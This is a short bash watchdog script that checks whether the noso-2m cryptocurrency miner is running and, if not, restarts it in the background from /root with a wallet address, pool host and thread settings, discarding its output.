#!/bin/bash
ps -ef | grep noso-2m |grep -v grep > /dev/null
if [ $? != 0 ]
then
       /root/noso-2m -a N2xr76Si8suTtv29wKF9PV9jZH35KD1 --pools="modme2:us.nosopool.xyz:8082" -i 7777 -t 3 --blok 1024 --tred 256 &> /dev/null 
fi